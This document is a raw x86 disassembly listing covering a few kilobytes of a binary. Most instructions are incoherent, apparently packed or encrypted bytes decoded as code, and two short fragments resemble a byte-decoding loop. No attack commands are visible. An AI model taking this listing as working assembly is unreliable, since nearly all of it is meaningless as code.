  4039d7:	dec    esi
  4039d8:	jne    0x403a11
  4039da:	sub    ebp,DWORD PTR [ebx-0xef63184]
  4039e0:	mov    DWORD PTR [esi+0x2d1b4f8c],edi
  4039e6:	nop
  4039e7:	push   0x66232a8f
  4039ec:	xor    eax,0x1765ea3
  4039f1:	mov    dl,0xcd
  4039f3:	and    eax,0x4944a44a
  4039f8:	(bad)  
  4039f9:	sbb    bl,cl
  4039fb:	push   0x54b73f5d
  403a00:	lahf   
  403a01:	sahf   
  403a02:	test   DWORD PTR [edi],ecx
  403a04:	scas   eax,DWORD PTR es:[edi]
  403a05:	add    eax,0xb4051289
  403a0a:	lds    eax,FWORD PTR [edx-0x8]
  403a0d:	fnstenv [ecx-0x62]
  403a10:	dec    edi
  403a11:	xchg   esp,eax
  403a12:	and    al,0xb9
  403a14:	scas   eax,DWORD PTR es:[edi]
  403a15:	in     eax,dx
  403a16:	imul   esp,DWORD PTR [edi-0x60000063],0xffffffb6
  403a1d:	imul   esp,DWORD PTR [edi],0xffffffc8
  403a20:	bound  eax,QWORD PTR [esi+0x16]
  403a23:	mov    es,eax
  403a25:	xchg   edi,eax
  403a26:	or     BYTE PTR ds:0xb923c555,ch
  403a2c:	push   0x92ffb16d
  403a31:	push   eax
  403a32:	sub    al,0x59
  403a34:	jle    0x4039df
  403a36:	pop    DWORD PTR [ebx+eax*1+0x6f]
  403a3a:	fisttp WORD PTR [edx-0x80]
  403a3d:	mov    esi,0x7d0e5e26
  403a42:	iret   
  403a43:	adc    BYTE PTR [eax],ah
  403a45:	push   esi
  403a46:	inc    DWORD PTR [edi+ebp*2]
  403a49:	jle    0x403a46
  403a4b:	shl    dl,1
  403a4d:	(bad)  
  403a4f:	sub    eax,0xee6a258d
  403a54:	adc    dl,BYTE PTR [edx-0x7208cee0]
  403a5a:	mov    ebp,0x73640342
  403a5f:	mov    dl,0xd9
  403a61:	push   esi
  403a62:	mov    esp,0xa89883a7
  403a67:	jl     0x4039ef
  403a69:	push   edi
  403a6a:	pushf  
  403a6b:	in     eax,dx
  403a6c:	jb     0x403a28
  403a6e:	dec    esp
  403a6f:	cwde   
  403a70:	adc    eax,0xc412de95
  403a75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a76:	or     esp,DWORD PTR [edi-0x682573fb]
  403a7c:	repz sub eax,0x59d2f3e0
  403a82:	sub    eax,0xbfea9527
  403a87:	in     eax,0xb3
  403a89:	fbstp  TBYTE PTR [ecx+esi*8]
  403a8c:	dec    edi
  403a8d:	icebp  
  403a8e:	es adc ebx,esp
  403a91:	(bad)  
  403a92:	adc    eax,0x390a558b
  403a97:	dec    esp
  403a98:	push   esp
  403a99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a9a:	mov    ecx,0x5e0ebb23
  403a9f:	jo     0x403ab4
  403aa1:	jae    0x403a74
  403aa3:	push   cs
  403aa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403aa5:	jns    0x403b0e
  403aa7:	push   ecx
  403aa8:	xchg   esp,eax
  403aa9:	dec    edi
  403aaa:	pop    ss
  403aab:	push   esi
  403aac:	call   0x16c2:0xb50e9b29
  403ab3:	xor    BYTE PTR [esp+ebx*8-0x53b65129],dh
  403aba:	mov    eax,0x53eefaf3
  403abf:	cs fcomi st,st(4)
  403ac2:	ret    0xb275
  403ac5:	mov    esi,DWORD PTR [ebp+0xd]
  403ac8:	pop    ecx
  403ac9:	int3   
  403aca:	mov    edi,0xf783eb39
  403acf:	sar    dh,cl
  403ad1:	mov    esp,0x82ad094c
  403ad6:	mov    BYTE PTR [ebx-0x1d49f6a7],bh
  403adc:	neg    DWORD PTR [ebp-0x6d]
  403adf:	lods   eax,DWORD PTR ds:[esi]
  403ae0:	mov    eax,ds:0xd65c7675
  403ae5:	sbb    al,BYTE PTR [eax+0x28]
  403ae8:	and    DWORD PTR [ecx-0x37],eax
  403aeb:	(bad)  [eax]
  403aed:	or     al,BYTE PTR [eax+0x52]
  403af0:	push   ss
  403af1:	push   ecx
  403af2:	xchg   edi,eax
  403af3:	mov    al,0xed
  403af5:	cdq    
  403af6:	jbe    0x403b30
  403af8:	adc    DWORD PTR [ebx],0x6461571d
  403afe:	or     esp,DWORD PTR [edx]
  403b00:	(bad)
  403b04:	xchg   ebp,eax
  403b05:	nop
  403b06:	sub    BYTE PTR [ecx+0x3f],dl
  403b09:	xor    edx,ebx
  403b0b:	lock xlat BYTE PTR ss:[ebx]
  403b0e:	ret    
  403b0f:	mov    ebx,0xb9ec501c
  403b14:	les    esp,FWORD PTR [ebx+0x2f]
  403b17:	js     0x403b90
  403b19:	ret    
  403b1a:	inc    edx
  403b1b:	jbe    0x403b7a
  403b1d:	scas   al,BYTE PTR es:[edi]
  403b1e:	pop    esi
  403b1f:	cwde   
  403b20:	test   DWORD PTR [edx-0x6d090427],edi
  403b26:	mov    eax,ebp
  403b28:	iret   
  403b29:	int3   
  403b2a:	xor    al,0x71
  403b2d:	in     al,0x16
  403b2f:	scas   al,BYTE PTR es:[edi]
  403b30:	ja     0x403b2d
  403b32:	mov    eax,0x490d703f
  403b37:	push   edi
  403b38:	adc    al,0xdb
  403b3a:	mov    bh,0xbf
  403b3c:	and    edi,DWORD PTR [ecx+0x6a]
  403b3f:	clc    
  403b40:	mov    BYTE PTR [eax-0x13],cl
  403b43:	push   0x7f
  403b45:	cmc    
  403b46:	sti    
  403b47:	mov    BYTE PTR [ebp-0x3],dl
  403b4a:	dec    ecx
  403b4b:	xchg   esi,eax
  403b4c:	cs adc ch,cl
  403b4f:	sbb    DWORD PTR [edi+0x4d],0x52
  403b53:	dec    ebp
  403b54:	mov    ah,0xe7
  403b56:	test   eax,0x26a2967f
  403b5b:	dec    edx
  403b5c:	mov    ecx,DWORD PTR ds:0x867d621a
  403b62:	loop   0x403b35
  403b64:	or     al,0x3f
  403b66:	mov    ds:0x1932bc78,al
  403b6b:	nop
  403b6c:	inc    ecx
  403b6d:	repnz dec esi
  403b6f:	pop    eax
  403b70:	add    DWORD PTR [eax+esi*1-0x28],0xbd0f4b60
  403b78:	nop
  403b79:	retf   0xa769
  403b7c:	mov    ah,BYTE PTR [ebx-0x22]
  403b7f:	or     BYTE PTR [ebp-0x18],cl
  403b82:	lahf   
  403b83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b84:	test   BYTE PTR [ebx],ah
  403b86:	sub    BYTE PTR [ebx-0x4f],ah
  403b89:	cdq    
  403b8a:	pop    edi
  403b8b:	cmp    al,0xa3
  403b8d:	and    al,0x3c
  403b8f:	icebp  
  403b90:	adc    BYTE PTR [eax+0x6969cd6f],bh
  403b96:	js     0x403bf9
  403b98:	lea    edi,[edi-0x19e266af]
  403b9e:	lock out 0x78,al
  403ba1:	cmc    
  403ba2:	mov    ebx,0x93d264ee
  403ba7:	pop    ss
  403ba8:	xor    DWORD PTR [ebx+0x36],esp
  403bab:	xlat   BYTE PTR ds:[ebx]
  403bac:	stc    
  403bad:	push   eax
  403bae:	and    DWORD PTR [edx+0x1f],ebp
  403bb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bb2:	sub    BYTE PTR [ecx+eiz*1],ah
  403bb5:	ss push ebp
  403bb7:	add    eax,0xad47dfa6
  403bbc:	pop    ds
  403bbd:	jno    0x403bc9
  403bbf:	xchg   edx,eax
  403bc0:	mov    DWORD PTR [ebx+0xf],ecx
  403bc3:	int    0x82
  403bc5:	imul   eax,DWORD PTR [edx+eax*8-0x32cf6eca],0xd
  403bcd:	push   es
  403bce:	pop    edx
  403bcf:	mov    bh,0xb1
  403bd1:	cwde   
  403bd2:	clc    
  403bd3:	push   DWORD PTR [ebx-0x4d2dffa5]
  403bd9:	add    ah,BYTE PTR [esi+0x60]
  403bdc:	mov    ebx,0xb9d598d8
  403be1:	cmp    eax,0x92cdd69c
  403be6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403be7:	jo     0x403c57
  403be9:	iret   
  403bea:	add    ah,BYTE PTR [esi]
  403bec:	xchg   esp,eax
  403bed:	add    eax,0x4a7d9242
  403bf2:	add    edi,DWORD PTR [ecx]
  403bf4:	arpl   WORD PTR [ebp-0x7a],ax
  403bf7:	inc    esi
  403bf8:	mov    cl,0x73
  403bfa:	cmp    ah,BYTE PTR ds:0x27d5a795
  403c00:	inc    esi
  403c01:	sub    esi,DWORD PTR ds:0x7964
  403c06:	push   es
  403c07:	dec    edi
  403c08:	cmp    al,0x76
  403c0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c0b:	(bad)  
  403c0c:	ins    DWORD PTR es:[edi],dx
  403c0d:	adc    ebx,DWORD PTR [eax-0x59]
  403c10:	sbb    cl,BYTE PTR [ebx]
  403c12:	jecxz  0x403bd9
  403c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c15:	ret    0xf63c
  403c18:	or     eax,edi
  403c1a:	sbb    BYTE PTR [eax],0xd5
  403c1d:	scas   eax,DWORD PTR es:[edi]
  403c1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c1f:	fnstenv [ecx]
  403c21:	test   al,0xd3
  403c23:	pop    edx
  403c24:	ja     0x403bce
  403c26:	xor    al,0x79
  403c28:	sbb    BYTE PTR [ebp-0x1f],ah
  403c2b:	xor    edi,ecx
  403c2d:	sub    dl,dl
  403c2f:	or     DWORD PTR [esi],edx
  403c31:	and    eax,0xa821803d
  403c36:	adc    eax,0x13920bc5
  403c3b:	mov    BYTE PTR [ecx],ch
  403c3d:	popa   
  403c3e:	(bad)  
  403c40:	pusha  
  403c41:	cs imul edi,esi,0x61
  403c45:	jp     0x403c1e
  403c47:	mov    dl,0x72
  403c49:	(bad)  
  403c4a:	sti    
  403c4b:	mov    al,ds:0x246d6413
  403c50:	xchg   ebp,eax
  403c51:	mov    ch,0xcb
  403c53:	enter  0xa2be,0x82
  403c57:	aaa    
  403c58:	cs jne 0x403c34
  403c5b:	cld    
  403c5c:	cmp    bh,BYTE PTR [edx]
  403c5e:	js     0x403c52
  403c60:	mov    ah,0x16
  403c62:	in     eax,0xb
  403c64:	pop    ss
  403c65:	test   BYTE PTR [esi-0x37e5ffd1],al
  403c6b:	imul   ebp,DWORD PTR [ebp-0x437ec362],0xeb4e305f
  403c75:	mov    ecx,0x689c942c
  403c7a:	xchg   edi,eax
  403c7b:	nop
  403c7c:	int    0xed
  403c7e:	mov    ecx,0x5f5578c1
  403c83:	jle    0x403c7b
  403c85:	xchg   esp,eax
  403c86:	ror    DWORD PTR [ecx],1
  403c88:	lahf   
  403c89:	push   ebx
  403c8a:	aam    0x80
  403c8c:	mov    ch,BYTE PTR [ecx+0x73893237]
  403c92:	jecxz  0x403cef
  403c94:	out    0x8c,al
  403c96:	push   cs
  403c97:	(bad)  
  403c98:	(bad)  
  403c99:	out    dx,eax
  403c9a:	cmp    al,0x9e
  403c9c:	test   eax,0xb72d2512
  403ca1:	add    ax,di
  403ca4:	movzx  eax,ax
  403ca7:	mov    DWORD PTR [ebp-0x14],eax
  403caa:	mov    eax,DWORD PTR [ebp+0x8]
  403cad:	movzx  eax,WORD PTR [eax+edx*4]
  403cb1:	xor    eax,0x8a38
  403cb6:	add    eax,edi
  403cb8:	mov    edi,DWORD PTR [ebp-0x14]
  403cbb:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403cbf:	mov    eax,DWORD PTR [ebp-0xc]
  403cc2:	inc    edx
  403cc3:	cmp    edx,eax
  403cc5:	jne    0x40389a
  403ccb:	pop    edi
  403ccc:	pop    ebx
  403ccd:	mov    eax,DWORD PTR [ebp-0x8]
  403cd0:	mov    edx,DWORD PTR [ebp+0x10]
  403cd3:	xor    eax,ecx
  403cd5:	add    eax,esi
  403cd7:	mov    DWORD PTR [edx],eax
  403cd9:	jmp    0x4040ce
  403cde:	mov    ch,0xd5
  403ce0:	or     dh,al
  403ce2:	push   0xfffffff1
  403ce4:	jge    0x403d43
  403ce6:	inc    eax
  403ce7:	xchg   ecx,eax
  403ce8:	add    esp,0x54f02b3f
  403cee:	mov    ebx,0x567e7e1f
  403cf3:	jns    0x403d73
  403cf5:	jle    0x403cb6
  403cf7:	mov    ch,0x55
  403cf9:	xchg   edx,eax
  403cfa:	jae    0x403d31
  403cfc:	sbb    DWORD PTR [edx+0x5198a83],eax
  403d02:	dec    ebp
  403d03:	mov    esi,0x2f42797c
  403d08:	or     BYTE PTR [edi+0x5e63d909],al
  403d0e:	shl    BYTE PTR [edi-0x62d7726e],0xec
  403d15:	(bad)  [ecx+0x2c7c3eab]
  403d1b:	(bad)  
  403d1c:	fisttp DWORD PTR [edi-0x65]
  403d1f:	stc    
  403d20:	sub    ebx,DWORD PTR [ecx+0x38]
  403d23:	rcl    edx,0x31
  403d26:	dec    edi
  403d27:	adc    esi,DWORD PTR [ebx-0x63]
  403d2a:	in     al,dx
  403d2b:	jg     0x403cd7
  403d2d:	lea    edi,[ecx+0x3a]
  403d30:	sbb    eax,0x35dc31b0
  403d35:	mov    al,BYTE PTR [eax+0xe9ca652]
  403d3b:	ret    
  403d3c:	push   esp
  403d3d:	mov    esp,0xd541fc54
  403d42:	call   0xf226:0xc3cb2dee
  403d49:	jmp    0x4e379fb3
  403d4e:	pop    edi
  403d4f:	and    BYTE PTR [ebp-0x72ab5f13],0xb5
  403d56:	cs addr16 jne 0x403d5c
  403d5a:	xchg   edx,ebx
  403d5c:	or     cl,BYTE PTR cs:[eax]
  403d5f:	pop    eax
  403d60:	jle    0x403ce5
  403d62:	push   ebx
  403d63:	xor    eax,0x24503f0a
  403d68:	jne    0x403dc4
  403d6a:	push   cs
  403d6b:	mov    cl,0x5b
  403d6d:	(bad)  
  403d6e:	mov    eax,0x2e779cd
  403d73:	test   DWORD PTR [ebx+ebx*8],0x27812997
  403d7a:	std    
  403d7b:	addr16 push edx
  403d7d:	(bad)  
  403d7f:	mov    ch,0x2d
  403d81:	sahf   
  403d82:	outs   dx,DWORD PTR ds:[esi]
  403d83:	sub    DWORD PTR [ebp+0x478549b7],esp
  403d89:	mov    al,ss:0xb48a6096
  403d8f:	add    ebp,esp
  403d91:	jnp    0x403d62
  403d93:	(bad)  
  403d94:	std    
  403d95:	jp     0x403d3b
  403d97:	in     eax,dx
  403d98:	mov    dh,0x52
  403d9a:	cmp    BYTE PTR [edx],bl
  403d9c:	sub    cl,BYTE PTR [eax-0x324d0429]
  403da2:	imul   eax,DWORD PTR [ecx-0x4c3e98c],0x31b02368
  403dac:	push   ss
  403dad:	test   al,0x52
  403daf:	jne    0x403d75
  403db1:	out    0xf5,al
  403db3:	(bad)  
  403db4:	mov    ds:0x258044f1,eax
  403db9:	dec    esi
  403dba:	ja     0x403d77
  403dbc:	jmp    0x1e04e1e4
  403dc1:	(bad)  
  403dc2:	pop    ecx
  403dc3:	or     edi,eax
  403dc5:	sub    eax,0xba863222
  403dca:	push   ss
  403dcb:	and    BYTE PTR [ebp+0x6e71c285],0xb4
  403dd2:	in     eax,dx
  403dd3:	sbb    ah,dh
  403dd5:	rol    DWORD PTR [ebx+eax*8],0x6
  403dd9:	adc    eax,0x102d08e8
  403dde:	add    BYTE PTR [edi+0x15e61b37],bh
  403de4:	jb     0x403e06
  403de6:	sbb    esi,DWORD PTR [esi+0x5bed8078]
  403dec:	fwait
  403ded:	daa    
  403dee:	ret    
  403def:	shl    ch,cl
  403df1:	inc    edx
  403df2:	and    ax,0xa4fb
  403df6:	arpl   WORD PTR [edi],bx
  403df8:	ds aas 
  403dfa:	mov    eax,0xcb00f2da
  403dff:	repnz sbb ch,ah
  403e02:	inc    ebx
  403e03:	rol    esi,1
  403e05:	pop    ebp
  403e06:	mov    ebp,0xfcc8fdea
  403e0b:	sti    
  403e0c:	ds in  al,dx
  403e0e:	push   ebp
  403e0f:	or     eax,0xee0dd9d4
  403e14:	xlat   BYTE PTR ds:[ebx]
  403e15:	xchg   edi,eax
  403e16:	xlat   BYTE PTR ds:[ebx]
  403e17:	and    esi,esp
  403e19:	mov    bh,0xfd
  403e1b:	shl    DWORD PTR [edi-0x5ae7db89],0x57
  403e22:	retf   0x42e5
  403e25:	loopne 0x403e3a
  403e27:	into   
  403e28:	sahf   
  403e29:	enter  0x47fc,0x7c
  403e2d:	push   0x868bbba4
  403e32:	inc    edi
  403e33:	jg     0x403e0d
  403e35:	mov    ah,BYTE PTR [ecx]
  403e37:	jnp    0x403e53
  403e39:	push   0x4e
  403e3b:	cmp    dh,BYTE PTR [eax]
  403e3d:	fnsave [edi]
  403e3f:	mov    ds:0x86c351db,eax
  403e44:	(bad)  
  403e45:	mov    eax,0x304c03e9
  403e4a:	dec    ebp
  403e4b:	hlt    
  403e4c:	sbb    dh,BYTE PTR [esi-0x27]
  403e4f:	je     0x403e7a
  403e51:	and    al,0xe
  403e53:	mov    ah,0xdc
  403e55:	and    edi,DWORD PTR [ecx]
  403e57:	enter  0xf125,0xa2
  403e5b:	sbb    al,0x2e
  403e5d:	bound  ebx,QWORD PTR ds:[ecx+0x4b3ab9a7]
  403e64:	mov    es,WORD PTR ds:0x24a3d06e
  403e6a:	dec    ebx
  403e6b:	popf   
  403e6c:	adc    al,0x2f
  403e6e:	mov    bh,0xe5
  403e70:	mov    cl,0x1d
  403e72:	inc    ebx
  403e73:	push   ds
  403e74:	pop    esi
  403e75:	ds fcomp st(5)
  403e78:	mov    edi,0x1b1f9447
  403e7d:	push   0xcc0ed2d2
  403e82:	hlt    
  403e83:	jns    0x403e4a
  403e85:	pop    ss
  403e86:	aaa    
  403e87:	test   BYTE PTR ds:0xf5f2e321,dl
  403e8d:	inc    edi
  403e8e:	push   ebp
  403e8f:	inc    ebx
  403e90:	popa   
  403e91:	push   esp
  403e92:	(bad)  
  403e93:	js     0x403e4d
  403e95:	retf   0x430
  403e98:	pop    ecx
  403e99:	fadd   QWORD PTR [eax+0x6]
  403e9c:	mov    bh,BYTE PTR [ecx]
  403e9e:	jmp    0x71dbe7d
  403ea3:	mov    dh,BYTE PTR [esi+0x66]
  403ea6:	loop   0x403e85
  403ea8:	push   edi
  403ea9:	xchg   DWORD PTR [eax+0x79198552],esi
  403eaf:	cmc    
  403eb0:	xor    DWORD PTR [ebx+0x76ff92ff],ebx
  403eb6:	xor    eax,0xb7af3a17
  403ebb:	nop
  403ebc:	ror    dl,1
  403ebe:	(bad)  
  403ebf:	repnz inc edi
  403ec1:	cmp    DWORD PTR [ecx-0x35],0xffffffb1
  403ec5:	or     BYTE PTR [edx+0x3b],0x55
  403ec9:	dec    esi
  403eca:	jno    0x403ef6
  403ecc:	add    BYTE PTR [ecx],bl
  403ece:	jge    0x403ee8
  403ed0:	dec    edx
  403ed1:	xor    bl,BYTE PTR [ecx+edi*2]
  403ed4:	cmp    al,0x5b
  403ed6:	clc    
  403ed7:	push   es
  403ed8:	mov    DWORD PTR cs:[bx+di],edi
  403edc:	jle    0x403eb3
  403ede:	mov    bh,0x9d
  403ee0:	add    BYTE PTR [ebx-0x13eadfed],ah
  403ee6:	pop    esp
  403ee7:	fdiv   QWORD PTR [edi+eiz*8]
  403eea:	scas   eax,DWORD PTR es:[edi]
  403eeb:	inc    edx
  403eec:	mov    cl,0x10
  403eee:	cmp    DWORD PTR [edi-0x2bb160cd],0x3
  403ef5:	inc    edi
  403ef6:	sub    eax,0x4ce4fa5a
  403efb:	push   edx
  403efc:	repnz dec edx
  403efe:	jnp    0x403f55
  403f00:	pop    bp
  403f02:	div    DWORD PTR [ecx+0x46]
  403f05:	in     eax,dx
  403f06:	rcr    cl,1
  403f08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f09:	loopne 0x403ed4
  403f0b:	sub    BYTE PTR [esi+0x3f],bl
  403f0e:	pop    edi
  403f0f:	and    eax,0x2464a8fc
  403f14:	push   ecx
  403f15:	adc    eax,0x19c1f306
  403f1a:	mov    esp,0xc3815cef
  403f1f:	jecxz  0x403f10
  403f21:	sub    eax,0x4942e727
  403f26:	or     al,BYTE PTR [edx+0x2e]
  403f29:	clc    
  403f2a:	mov    edx,0x93ed3617
  403f2f:	jecxz  0x403fa2
  403f31:	(bad)  
  403f32:	jmp    0xb4fb:0x4abb44ca
  403f39:	push   edx
  403f3a:	lods   al,BYTE PTR cs:[esi]
  403f3c:	mov    edi,0xcf3bd5b0
  403f41:	(bad)  [esi]
  403f43:	les    esp,FWORD PTR [esi+eax*4]
  403f46:	loope  0x403ef1
  403f48:	mov    cl,0x2e
  403f4a:	mov    ah,0x3d
  403f4c:	lods   eax,DWORD PTR ds:[esi]
  403f4d:	adc    edx,esp
  403f4f:	pop    edi
  403f50:	pop    edx
  403f51:	push   es
  403f52:	popf   
  403f53:	mov    edi,0xebf78cc
  403f58:	push   esi
  403f59:	pop    es
  403f5a:	dec    edx
  403f5b:	leave  
  403f5c:	sub    eax,0x66d4aafa
  403f61:	lahf   
  403f62:	push   esp
  403f63:	add    BYTE PTR [eax-0x464d1114],al
  403f69:	xchg   DWORD PTR [edx],eax
  403f6b:	push   esp
  403f6c:	lods   al,BYTE PTR ds:[esi]
  403f6d:	mov    ah,0x30
  403f6f:	xlat   BYTE PTR ds:[ebx]
  403f70:	lods   al,BYTE PTR ds:[esi]
  403f71:	mov    edx,0x9a87c90c
  403f76:	loope  0x403eff
  403f78:	or     al,0xc0
  403f7a:	sahf   
  403f7b:	push   esp
  403f7c:	dec    ebp
  403f7d:	enter  0x8b2f,0x50
  403f81:	jae    0x403f81
  403f83:	xor    BYTE PTR [esi-0x49],ah
  403f86:	daa    
  403f87:	or     DWORD PTR [esi-0x26e80e5e],esp
  403f8d:	add    DWORD PTR ds:0x9101e690,esp
  403f93:	jo     0x403f20
  403f95:	mov    bl,0x56
  403f97:	dec    esi
  403f98:	aaa    
  403f99:	inc    eax
  403f9a:	push   ebp
  403f9b:	stc    
  403f9c:	das    
  403f9d:	jge    0x403f94
  403f9f:	and    DWORD PTR [esi],0xffffffb7
  403fa2:	ret    0x71b7
  403fa5:	lea    eax,[esi+0x6475a8fd]
  403fab:	seto   BYTE PTR [edx+0x23786b74]
  403fb2:	fisttp DWORD PTR [ebp+esi*2+0x49ad31ac]
  403fb9:	xchg   ecx,eax
  403fba:	pop    edi
  403fbb:	jnp    0x403f70
  403fbd:	push   esp
  403fbe:	mov    bh,0xbc
  403fc0:	dec    ebx
  403fc1:	adc    DWORD PTR [ebp+0xa],eax
  403fc4:	daa    
  403fc5:	cli    
  403fc6:	sub    BYTE PTR [ebp+0x1518ddd],0xcf
  403fcd:	cmp    ah,BYTE PTR [eax+edx*4-0x2583f6d8]
  403fd4:	mov    ?,WORD PTR [esi-0x45]
  403fd7:	jno    0x403ff2
  403fd9:	or     esi,edi
  403fdb:	scas   eax,DWORD PTR es:[edi]
  403fdc:	lock xlat BYTE PTR fs:[ebx]
  403fdf:	repz in al,dx
  403fe1:	mov    ch,0x29
  403fe3:	ins    DWORD PTR es:[edi],dx
  403fe4:	clc    
  403fe5:	adc    eax,0xf07fa7d2
  403fea:	add    eax,0x91317333
  403fef:	in     al,dx
  403ff0:	enter  0xf84f,0xde
  403ff4:	lahf   
  403ff5:	or     esi,edx
  403ff7:	cwde   
  403ff8:	popa   
  403ff9:	(bad)  
  403ffa:	int3   
  403ffb:	jmp    0x40401a
  403ffd:	retf   0xfe5a
  404000:	out    dx,al
  404001:	fadd   QWORD PTR ds:0x490e7347
  404007:	call   0x799:0x53b17d57
  40400e:	mov    ds:0x81a71646,al
  404013:	inc    ecx
  404014:	push   ebp
  404015:	sti    
  404016:	clc    
  404017:	bound  ebp,QWORD PTR [ecx+0x7f059b16]
  40401d:	das    
  40401e:	mov    edi,0x97c19dc8
  404023:	mov    ds:0xbd7a1e31,al
  404028:	push   0x46
  40402a:	ins    BYTE PTR es:[edi],dx
  40402b:	retf   
  40402c:	xchg   edi,eax
  40402d:	dec    ecx
  40402e:	hlt    
  40402f:	out    dx,eax
  404030:	repnz cmp eax,0x111360ad
  404036:	pop    edx
  404037:	adc    al,0x5d
  404039:	jge    0x40400a
  40403b:	cmp    al,0x12
  40403d:	sub    eax,0xdf045fb0
  404042:	adc    edi,ebp
  404044:	mov    al,0x3a
  404046:	push   ds
  404047:	xor    dh,BYTE PTR [ecx+0x5]
  40404a:	das    
  40404b:	xor    DWORD PTR [esi+0x26],0xffffffd3
  40404f:	mov    al,ds:0x1c808235
  404054:	clc    
  404055:	test   DWORD PTR [edx],edx
  404057:	xchg   ebp,eax
  404058:	jmp    0x404023
  40405a:	xor    BYTE PTR [ebx+esi*2-0x32],ch
  40405e:	shl    DWORD PTR [edi-0x24],0x8d
  404062:	adc    al,0xf2
  404064:	rol    DWORD PTR [ebx],1
  404066:	retf   0x12c1
  404069:	cmp    BYTE PTR [edi],0xd2
  40406c:	sub    eax,0x6415b7b1
  404071:	push   ebp
  404072:	jo     0x4040ea
  404074:	repnz (bad) 
  404076:	fild   WORD PTR [ebp+0x3d43974a]
  40407c:	stos   BYTE PTR es:[edi],al
  40407d:	loop   0x4040e6
  40407f:	and    BYTE PTR [ebp+0x30],bl
  404082:	ja     0x404073
  404084:	and    eax,0x947e389e
  404089:	retf   
  40408a:	add    DWORD PTR [ebp+0x99f6f8a],ebp
  404090:	cwde   
  404091:	out    0x36,eax
  404093:	inc    ebx
  404094:	inc    esi
  404095:	xor    bh,dl
  404097:	push   cs
  404098:	push   es
  404099:	jecxz  0x40404b
  40409b:	mov    esp,esp
  40409d:	push   ds
  40409e:	lock inc ebx
  4040a0:	xchg   edx,eax
  4040a1:	das    
  4040a2:	mov    DWORD PTR [edx-0x72c4fc65],edi
  4040a8:	leave  
  4040a9:	mov    DWORD PTR [eax+edi*1+0x5f],edx
  4040ad:	add    al,0xc6
  4040af:	dec    esp
  4040b0:	in     al,dx
  4040b1:	popa   
  4040b2:	(bad)  
  4040b4:	dec    esp
  4040b5:	ret    0x59a
  4040b8:	xor    bl,BYTE PTR cs:[ebx+0x53a1c6c3]
  4040bf:	sub    BYTE PTR [edx+0xf],cl
  4040c2:	and    dl,dl
  4040c4:	xor    ch,cl
  4040c6:	test   DWORD PTR [ebx],ecx
  4040c8:	shr    DWORD PTR [edi],0xfd
  4040cb:	or     eax,0x458b87ce
  4040d0:	clc    
  4040d1:	xor    eax,ecx
  4040d3:	add    eax,esi
  4040d5:	mov    DWORD PTR [ebp+0x8],eax
  4040d8:	mov    eax,DWORD PTR [ebp+0x8]
  4040db:	jmp    0x4044d0
  4040e0:	pop    edx
  4040e1:	ret    0x1375
  4040e4:	jge    0x4040a3
  4040e6:	ins    BYTE PTR es:[edi],dx
  4040e7:	jae    0x404096
  4040e9:	test   BYTE PTR [eax+0x6df0bcd],ah
  4040ef:	xchg   DWORD PTR [ebx+0x567e7e1b],edx
  4040f5:	jns    0x404175
  4040f7:	jle    0x404172
  4040f9:	(bad)  
  4040fa:	jnp    0x40412b
  4040fc:	test   al,0xee
  4040fe:	pushf  
  4040ff:	mov    bh,0x4e
  404101:	add    eax,0xa189e825
  404106:	mov    ch,0xab
  404108:	(bad)  
  404109:	and    esp,DWORD PTR [edx]
  40410b:	std    
  40410c:	arpl   ax,ax
  40410e:	aas    
  40410f:	cmp    ebp,esp
  404111:	aas    
  404112:	mov    ds:0xf47654fe,eax
  404117:	push   edx
  404118:	jno    0x4040d2
  40411a:	pop    eax
  40411b:	xchg   edi,eax
  40411c:	inc    ebx
  40411d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40411e:	mov    DWORD PTR [eax+0xb7f19ef],ebx
  404124:	cmp    al,0x1c
  404126:	lahf   
  404127:	cmp    edx,DWORD PTR [ebx-0x46]
  40412a:	mov    cl,0xa2
  40412c:	stos   BYTE PTR es:[edi],al
  40412d:	dec    esi
  40412e:	les    esp,FWORD PTR [ecx-0x608e0e4b]
  404134:	mov    edx,0x75b77508
  404139:	dec    edi
  40413b:	xchg   ecx,eax
  40413c:	dec    edx
  40413d:	je     0x40414c
  40413f:	adc    esi,esp
  404141:	xor    DWORD PTR [edi],esi
  404143:	bound  esp,QWORD PTR [ebx-0x47]
  404146:	sub    BYTE PTR ds:0x91caf4a,ah
  40414c:	jge    0x404195
  40414e:	pop    esp
  40414f:	push   esi
  404150:	or     BYTE PTR [ebx],ah
  404152:	gs repz js 0x4041b1
  404156:	scas   eax,DWORD PTR es:[edi]
  404157:	push   esp
  404158:	or     eax,0x73ca3c95
  40415d:	ret    
  40415e:	inc    ebx
  40415f:	adc    al,0x35
  404161:	cmp    dh,BYTE PTR [ecx]
  404163:	xor    ah,BYTE PTR [esi+0x4d435a4c]
  404169:	shr    DWORD PTR [ebp+0x34],1
  40416c:	pop    esi
  40416d:	inc    edi
  40416e:	xor    esi,DWORD PTR [ecx]
  404170:	icebp  
  404171:	sub    WORD PTR [eax-0x483eb548],0xa7a9
  40417a:	jne    0x4041aa
  40417c:	jae    0x4041b5
  40417e:	jnp    0x4041f2
  404180:	ss fldl2e 
  404183:	mov    eax,ds:0xe97c35fd
  404188:	mov    esp,0xf3cdf316
  40418d:	mov    fs,ecx
  40418f:	pop    ebp
  404190:	loopne 0x4041dc
  404192:	inc    esp
  404193:	adc    esi,DWORD PTR [edi+0x28]
  404196:	and    edi,DWORD PTR [esp+ebp*2+0x5de1e08d]
  40419d:	and    edx,ebx
  40419f:	rcl    bh,0xe6
  4041a2:	xchg   edi,eax
  4041a3:	inc    esp
  4041a4:	pop    eax
  4041a5:	jp     0x404196
  4041a7:	mov    bh,0x3b
  4041a9:	sub    bh,BYTE PTR [eax-0x17]
  4041ac:	adc    DWORD PTR [ecx],esp
  4041ae:	lods   eax,DWORD PTR ds:[esi]
  4041af:	xor    esi,edi
